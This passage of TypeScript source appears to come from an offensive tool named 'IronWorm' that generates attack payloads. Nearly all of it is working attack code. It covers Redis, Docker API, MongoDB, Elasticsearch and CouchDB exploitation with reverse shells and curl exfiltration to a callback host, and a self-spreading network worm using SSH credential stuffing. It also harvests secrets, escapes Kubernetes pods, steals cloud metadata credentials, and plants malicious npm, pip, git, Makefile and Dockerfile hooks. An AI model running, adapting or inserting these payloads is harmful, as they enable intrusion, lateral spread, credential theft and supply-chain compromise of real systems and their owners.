      steps.push(`[i] ${svc.name} TCP check script generated for ${targetHost}:${svc.port}`);
      artifacts.push(buildServiceExploitPayload(svc.name, targetHost, svc.port, cbHost, cbPort, ""));
    }
  }

  return {
    id: `svc_scan_${targetHost.replace(/\./g, "_")}`,
    name: `Exposed Services — ${targetHost}`,
    target: targetHost,
    category: "exposed-services",
    status: artifacts.length > 0 ? "success" : "info",
    severity: "critical",
    detail: `${artifacts.length} exploitable unauthenticated service(s) found/generated for ${targetHost}`,
    artifacts,
    steps,
  };
}

function buildServiceExploitPayload(svc: string, host: string, port: number, cbHost: string, cbPort: string, banner: string): string {
  const cb = `http://${cbHost}:${cbPort}`;
  switch (svc) {
    case "Redis":
      return `# Redis RCE via CONFIG SET — ${host}:${port}
# Banner: ${banner.slice(0,80)}
redis-cli -h ${host} -p ${port} CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h ${host} -p ${port} CONFIG SET dbfilename root
redis-cli -h ${host} -p ${port} SET NX_CRON "\\n\\n*/5 * * * * bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1\\n\\n"
redis-cli -h ${host} -p ${port} BGSAVE

# Alternative: write SSH key
redis-cli -h ${host} -p ${port} CONFIG SET dir /root/.ssh
redis-cli -h ${host} -p ${port} CONFIG SET dbfilename authorized_keys
redis-cli -h ${host} -p ${port} SET NX_KEY "\\n\\nssh-rsa AAAAB3NzaC1yc2E... attacker@nexus\\n\\n"
redis-cli -h ${host} -p ${port} BGSAVE

# Exfil all keys
redis-cli -h ${host} -p ${port} KEYS '*' | while read k; do
  echo "$k=$(redis-cli -h ${host} -p ${port} GET $k)" | curl -sk -X POST ${cb}/redis_dump --data-binary @-
done`;

    case "MongoDB":
      return `# MongoDB Unauthenticated Dump — ${host}:${port}
mongodump --host ${host} --port ${port} --out /tmp/nx_mongodump 2>/dev/null
tar czf /tmp/nx_mongo.tgz /tmp/nx_mongodump
curl -sk -X POST ${cb}/mongo_dump -F "data=@/tmp/nx_mongo.tgz"

# Enumerate collections
mongo --host ${host} --port ${port} --eval "db.adminCommand({listDatabases:1})" 2>/dev/null | \\
  curl -sk -X POST ${cb}/mongo_enum --data-binary @-

# Inject malicious document for persistence
mongo --host ${host} --port ${port} admin --eval \\
  "db.createUser({user:'nxadmin',pwd:'$(openssl rand -hex 16)',roles:[{role:'root',db:'admin'}]})"`;

    case "Docker API":
      return `# Docker API RCE (unauthenticated) — ${host}:${port}
# Create privileged container → mount host filesystem

DOCKER_HOST="tcp://${host}:${port}"

# Method 1: privileged container with host PID namespace
docker -H $DOCKER_HOST run --rm -it --privileged --pid=host \\
  alpine nsenter -t 1 -m -u -i -n -p -- \\
  bash -c "curl -sk ${cb}/docker_rce?h=\$(hostname|base64 -w0); bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"

# Method 2: volume mount host root
docker -H $DOCKER_HOST run --rm -v /:/host -w /host alpine \\
  sh -c "chroot /host bash -c 'curl -sk ${cb}/docker_mount?h=\$(hostname|base64 -w0) && bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1'"

# Method 3: REST API container exec
curl -sk -X POST "http://${host}:${port}/containers/create" \\
  -H "Content-Type: application/json" \\
  -d '{"Image":"alpine","Cmd":["sh","-c","wget -qO- ${cb}/docker_api.sh|sh"],"HostConfig":{"Privileged":true,"Binds":["/:/host"],"NetworkMode":"host"}}' | \\
  python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])" | \\
  xargs -I{} curl -sk -X POST "http://${host}:${port}/containers/{}/start"`;

    case "Elasticsearch":
      return `# Elasticsearch Data Exfil + Pivot — ${host}:${port}
# Banner: ${banner.slice(0,80)}

# Enumerate indices
curl -sk "http://${host}:${port}/_cat/indices?v&h=index,docs.count,store.size" | \\
  curl -sk -X POST ${cb}/es_indices --data-binary @-

# Dump all data from all indices
curl -sk "http://${host}:${port}/_search?size=1000&pretty" | \\
  curl -sk -X POST ${cb}/es_dump --data-binary @-

# Hunt for sensitive data
for idx in users accounts passwords secrets credentials tokens keys; do
  curl -sk "http://${host}:${port}/_search?q=$idx&size=100" 2>/dev/null | \\
    curl -sk -X POST "${cb}/es_hunt?idx=$idx" --data-binary @-
done`;

    case "CouchDB":
      return `# CouchDB RCE via OS Command execution — ${host}:${port}
curl -sk -X PUT "http://${host}:${port}/_node/_local/_config/query_servers/cmd" \\
  -d '"bash -c \\"curl -sk ${cb}/couch_rce?h=\$(hostname|base64 -w0)\\" > /dev/null 2>&1"'

curl -sk -X PUT "http://${host}:${port}/nx_rce"
curl -sk -X PUT "http://${host}:${port}/nx_rce/1" -d '{"_id":"1","language":"cmd","views":{"nx":{"map":"function(x){}"}}}'
curl -sk "http://${host}:${port}/nx_rce/_design/1/_view/nx"`;

    default:
      return `# ${svc} — ${host}:${port}
# Service detected, check for default credentials and public CVEs
# Callback: ${cb}
# Banner: ${banner.slice(0,120)}`;
  }
}

/* ─────────────────────────────────────────────────────────────────────────
   Internal Network CIDR Scanner + Worm Propagation
   ───────────────────────────────────────────────────────────────────────── */
function buildNetworkWormPayload(cbHost: string, cbPort: string): IronWormResult {
  const cb = `${cbHost}:${cbPort}`;
  const wormBash = `#!/bin/bash
# NEXUS Network Worm — scans internal subnets, exploits exposed services,
# spreads via SSH, Redis RCE, Docker API, unauthenticated MongoDB/ES
# C2: ${cb}

CB_HOST="${cbHost}"
CB_PORT="${cbPort}"
CB="http://$CB_HOST:$CB_PORT"
LOCK="/tmp/.nx_$(id -u)_$(hostname|md5sum|cut -c1-8)"
[ -f "$LOCK" ] && exit 0; touch "$LOCK"

log() { curl -sk "$CB/log?h=$(hostname|base64 -w0)&m=$(echo $@|base64 -w0)" 2>/dev/null & }
log "worm_start"

# Discover all internal subnets
SUBNETS=$(ip -o -f inet addr show 2>/dev/null | awk '{print $4}' | grep -Ev '^127\\.' | \\
  while read cidr; do echo "$cidr"|cut -d/ -f1|cut -d. -f1-3; done | sort -u)

scan_host() {
  local ip="$1"
  ip addr show 2>/dev/null | grep -q "$ip" && return

  # Redis RCE
  if timeout 2 bash -c "echo >/dev/tcp/$ip/6379" 2>/dev/null; then
    redis-cli -h "$ip" -p 6379 CONFIG SET dir /var/spool/cron/crontabs 2>/dev/null
    redis-cli -h "$ip" -p 6379 CONFIG SET dbfilename root 2>/dev/null
    redis-cli -h "$ip" -p 6379 SET NX "\\n*/5 * * * * curl -sk $CB/r.sh|bash\\n" 2>/dev/null
    redis-cli -h "$ip" -p 6379 BGSAVE 2>/dev/null
    log "redis_pwn:$ip"
  fi

  # Docker API RCE
  if timeout 2 bash -c "echo >/dev/tcp/$ip/2375" 2>/dev/null; then
    curl -sk -X POST "http://$ip:2375/containers/create" \\
      -H "Content-Type: application/json" \\
      -d '{"Image":"alpine","Cmd":["sh","-c","wget -qO- '"$CB"'/d.sh|sh"],"HostConfig":{"Privileged":true,"NetworkMode":"host","Binds":["/:/h"]}}' \\
      | python3 -c "import sys,json;print(json.load(sys.stdin).get('Id',''))" 2>/dev/null \\
      | xargs -I{} curl -sk -X POST "http://$ip:2375/containers/{}/start" 2>/dev/null
    log "docker_pwn:$ip"
  fi

  # SSH spread
  if timeout 2 bash -c "echo >/dev/tcp/$ip/22" 2>/dev/null; then
    for k in ~/.ssh/id_rsa ~/.ssh/id_ed25519 /root/.ssh/id_* /home/*/.ssh/id_*; do
      [ -f "$k" ] || continue
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o BatchMode=yes -o LogLevel=ERROR \\
          -i "$k" root@"$ip" \\
          "curl -sk $CB/worm.sh|bash" 2>/dev/null && { log "ssh_key:$ip"; break; }
    done
    command -v sshpass >/dev/null && for cred in root:root root:toor root:password admin:admin admin:password ubuntu:ubuntu pi:raspberry; do
      u="\${cred%%:*}" p="\${cred#*:}"
      sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 -o LogLevel=ERROR \\
        "$u@$ip" "curl -sk $CB/worm.sh|bash" 2>/dev/null && { log "ssh_cred:$ip:$u"; break; }
    done
  fi

  # Kubernetes API
  if timeout 2 bash -c "echo >/dev/tcp/$ip/6443" 2>/dev/null; then
    curl -sk "https://$ip:6443/api/v1/namespaces" 2>/dev/null | \\
      python3 -c "import sys,json;ns=[n['metadata']['name'] for n in json.load(sys.stdin).get('items',[])];print(' '.join(ns))" 2>/dev/null | \\
      xargs -I{} curl -sk "$CB/k8s_ns?ip=$ip&ns={}"
    log "k8s_probe:$ip"
  fi
}

export -f scan_host log
export CB_HOST CB_PORT CB

for subnet in $SUBNETS; do
  for i in $(seq 1 254); do
    scan_host "$subnet.$i" &
    sleep 0.05
    jobs -r | wc -l | grep -q '^[5-9][0-9]' && wait
  done
done
wait
log "worm_done"`;

  const dockerWorm = `# Docker-in-Docker worm propagation
# If you have Docker API access, create worm container in every reachable host

TARGETS_SCRIPT='
import socket, subprocess, re, sys
def scan(base, ports=[2375, 2376, 6379, 27017]):
    found = []
    for i in range(1, 255):
        ip = f"{base}.{i}"
        for p in ports:
            try:
                s = socket.create_connection((ip, p), timeout=1.5)
                s.close()
                found.append((ip, p))
                break
            except: pass
    return found

import subprocess
result = subprocess.run(["ip","-o","-f","inet","addr","show"], capture_output=True, text=True)
subnets = set()
for line in result.stdout.splitlines():
    m = re.search(r"(\\d+\\.\\d+\\.\\d+)\\.\\d+/", line)
    if m: subnets.add(m.group(1))

for s in subnets:
    for ip, port in scan(s):
        print(f"{ip}:{port}")
'
python3 -c "$TARGETS_SCRIPT" | while IFS=: read ip port; do
  [ "$port" = "2375" ] || [ "$port" = "2376" ] && \\
    docker -H "tcp://$ip:$port" run --rm -d --network=host --privileged \\
      -v /:/host alpine sh -c "curl -sk http://${cbHost}:${cbPort}/worm.sh | sh" 2>/dev/null && \\
    echo "[+] Worm deployed to $ip:$port via Docker API"
done`;

  const envHarvest = `#!/bin/bash
# .env / secrets harvesting from common locations across network

CB="http://${cbHost}:${cbPort}"

harvest_local() {
  # Hunt for .env files, credentials, SSH keys, cloud tokens
  find / \\( -name ".env" -o -name ".env.local" -o -name ".env.production" \\
            -o -name "*.pem" -o -name "id_rsa" -o -name "id_ed25519" \\
            -o -name "credentials.json" -o -name "service-account.json" \\
            -o -name ".aws/credentials" -o -name ".gcloud/credentials.db" \\
            -o -name "kubeconfig" -o -name ".kube/config" \\
            -o -name "vault-token" -o -name ".vault-token" \\
            -o -name "terraform.tfvars" \\
           \\) -readable 2>/dev/null | head -100 | while read f; do
    echo "=== $f ==="
    cat "$f" 2>/dev/null | head -80
    echo ""
  done | base64 -w0 | curl -sk -X POST "$CB/secrets_dump" --data-binary @-

  # Process environment variables (running processes may expose creds)
  for pid in /proc/[0-9]*/environ; do
    cat "$pid" 2>/dev/null | tr '\\0' '\\n' | \\
      grep -iE '(TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCLOUD|DATABASE_URL|REDIS_URL|MONGO)' 2>/dev/null
  done | base64 -w0 | curl -sk -X POST "$CB/proc_env" --data-binary @-

  # History files
  for hf in ~/.bash_history ~/.zsh_history ~/.sh_history ~/.psql_history ~/.mysql_history; do
    [ -f "$hf" ] && cat "$hf" | base64 -w0 | curl -sk "$CB/history?f=$(basename $hf)" --data-binary @-
  done
}

harvest_local`;

  return {
    id: "network_worm",
    name: "Network Worm Propagation Engine",
    target: `${cbHost}:${cbPort}`,
    category: "network-worm",
    status: "success",
    severity: "critical",
    detail: `Full network worm: SSH credential stuffing, Redis RCE, Docker API exec, K8s probe, .env harvesting`,
    artifacts: [wormBash, dockerWorm, envHarvest],
    steps: [
      "[gen] Bash network worm with Redis/Docker/SSH spread",
      "[gen] Docker API multi-host worm propagation",
      "[gen] .env and secrets harvesting script",
    ],
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   Kubernetes / Cloud Lateral Movement
   ───────────────────────────────────────────────────────────────────────── */
function buildK8sCloudLateral(cbHost: string, cbPort: string): IronWormResult {
  const cb = `http://${cbHost}:${cbPort}`;
  const artifacts = [
    `#!/bin/bash
# Kubernetes RBAC Privilege Escalation + Pod Escape
CB="${cb}"

# Check if running inside a pod
[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] || exit 0
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Enumerate RBAC permissions
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" 2>/dev/null | \\
  python3 -c "import sys,json;[print(n['metadata']['name']) for n in json.load(sys.stdin).get('items',[])]"

# Create privileged pod to escape to host
curl -sk -X POST "$APISERVER/api/v1/namespaces/$NAMESPACE/pods" \\
  -H "Authorization: Bearer $TOKEN" \\
  -H "Content-Type: application/json" \\
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "nx-escape"},
    "spec": {
      "hostPID": true, "hostNetwork": true,
      "containers": [{
        "name": "nx",
        "image": "alpine",
        "command": ["sh", "-c", "nsenter -t 1 -m -u -i -n -p -- bash -c \\"curl -sk '"$cb"'/k8s_escape.sh|bash\\""],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name":"host","mountPath":"/host"}]
      }],
      "volumes": [{"name":"host","hostPath":{"path":"/"}}]
    }
  }' 2>/dev/null | curl -sk -X POST "$CB/k8s_pod_create" --data-binary @-

# Exfil all secrets from all namespaces
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" 2>/dev/null | \\
  python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for s in data.get('items',[]):
    name = s['metadata']['name']
    ns   = s['metadata']['namespace']
    for k,v in s.get('data',{}).items():
        try: print(f'{ns}/{name}/{k}: {base64.b64decode(v).decode()}')
        except: pass
" | curl -sk -X POST "$CB/k8s_secrets" --data-binary @-`,

    `#!/bin/bash
# AWS IMDS metadata exfil + credential theft
CB="${cb}"

# IMDSv1 (no token needed)
IMDS="http://169.254.169.254/latest"
ROLE=$(curl -sk --max-time 3 "$IMDS/meta-data/iam/security-credentials/" 2>/dev/null)
if [ -n "$ROLE" ]; then
  CREDS=$(curl -sk --max-time 3 "$IMDS/meta-data/iam/security-credentials/$ROLE")
  echo "AWS_ROLE=$ROLE"
  echo "$CREDS"
  echo "$CREDS" | curl -sk -X POST "$CB/aws_creds" --data-binary @-
fi

# IMDSv2 (requires PUT token)
TOKEN=$(curl -sk -X PUT "http://169.254.169.254/latest/api/token" \\
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" --max-time 3 2>/dev/null)
[ -n "$TOKEN" ] && ROLE=$(curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" \\
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 3)
[ -n "$ROLE" ] && curl -sk -H "X-aws-ec2-metadata-token: $TOKEN" \\
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | \\
  curl -sk -X POST "$CB/aws_creds_v2" --data-binary @-

# Azure IMDS
curl -sk -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --max-time 3 | \\
  curl -sk -X POST "$CB/azure_token" --data-binary @-

# GCP metadata
curl -sk -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" --max-time 3 | \\
  curl -sk -X POST "$CB/gcp_token" --data-binary @-`,
  ];

  return {
    id: "k8s_cloud_lateral",
    name: "Kubernetes + Cloud Lateral Movement",
    target: `${cbHost}:${cbPort}`,
    category: "k8s-cloud",
    status: "success",
    severity: "critical",
    detail: "K8s RBAC privesc + pod escape, AWS/Azure/GCP IMDS credential theft",
    artifacts,
    steps: ["[gen] Kubernetes pod escape + secret exfil", "[gen] Cloud IMDS metadata credential theft"],
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   Payload Generation Mode
   ───────────────────────────────────────────────────────────────────────── */
function generateSupplyChainPayloads(cbHost: string, cbPort: string): IronWormResult {
  const cb = `http://${cbHost}:${cbPort}`;
  const artifacts = [
    `# Malicious npm postinstall hook
"scripts": { "postinstall": "node -e \\"require('child_process').exec('curl -sk ${cb}/\${require('os').hostname()}\${process.env.USER?'?u='+process.env.USER:''}')\\"" }`,

    `# Malicious pip setup.py exec
import subprocess; subprocess.Popen(["curl","-sk","${cb}/pip_hook"])`,

    `# Git hook (post-merge) — fires after git pull
#!/bin/sh
curl -sk "${cb}/git_hook?r=$(git remote get-url origin|base64 -w0)" &`,

    `# Makefile build injection
all:
\tcurl -sk ${cb}/make_hook &
\t@$(MAKE) -f Makefile.orig all 2>/dev/null`,

    `# Docker base image supply chain (Dockerfile)
FROM alpine:3.18
RUN curl -sk ${cb}/docker_pull > /tmp/.nx && sh /tmp/.nx &
# ... rest of legitimate Dockerfile`,
  ];

  return {
    id: "payload_gen",
    name: "Supply Chain Payload Generator",
    target: `${cbHost}:${cbPort}`,
    category: "payload-gen",
    status: "success",
    severity: "critical",
    detail: `${artifacts.length} supply chain attack payloads generated for callback ${cb}`,
    artifacts,
    steps: artifacts.map((_, i) => `[gen] Payload ${i+1} ready`),
  };
}

/* ─────────────────────────────────────────────────────────────────────────
   Main Orchestrator
   ───────────────────────────────────────────────────────────────────────── */
export async function ironWormScan(opts: IronWormOptions): Promise<IronWormResult[]> {
  const {
    packageName     = "",
    githubOrg       = "",
    githubRepo      = "",
    depConfusionOrg = "",
    cbHost          = "LHOST",
    cbPort          = "9999",
  } = opts;

  const results: IronWormResult[] = [];

  logger.info({ opts: { packageName, githubOrg, githubRepo, depConfusionOrg, cbHost } }, "IronWorm scan started");

  const tasks: Promise<IronWormResult | null>[] = [];

  if (packageName) {
    tasks.push(checkNpmTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "npm typosquat check failed"); return null;
    }));
    tasks.push(checkPipTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "pip typosquat check failed"); return null;
    }));
    tasks.push(checkGemTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "gem typosquat check failed"); return null;
    }));
    tasks.push(checkCargoTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "cargo typosquat check failed"); return null;
    }));
    tasks.push(checkNuGetTyposquat(packageName, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "nuget typosquat check failed"); return null;
    }));
  }

  if (depConfusionOrg || githubOrg) {
    tasks.push(checkDepConfusion(depConfusionOrg || githubOrg, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "dep confusion check failed"); return null;
    }));
  }

  if (githubOrg) {
    tasks.push(checkGithubActions(githubOrg, githubRepo || "main", cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "GitHub actions check failed"); return null;
    }));
    tasks.push(checkSshScan(cbHost, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "ssh scan failed"); return null;
    }));
    tasks.push(checkExposedServices(cbHost, cbHost, cbPort).catch(e => {
      logger.error({ err:e }, "exposed services scan failed"); return null;
    }));
  }

  results.push(generateSupplyChainPayloads(cbHost, cbPort));
  results.push(buildNetworkWormPayload(cbHost, cbPort));
  results.push(buildK8sCloudLateral(cbHost, cbPort));

  const settled = await Promise.all(tasks);
  for (const r of settled) if (r) results.push(r);

  logger.info({ count: results.length }, "IronWorm scan complete");
  return results;
}
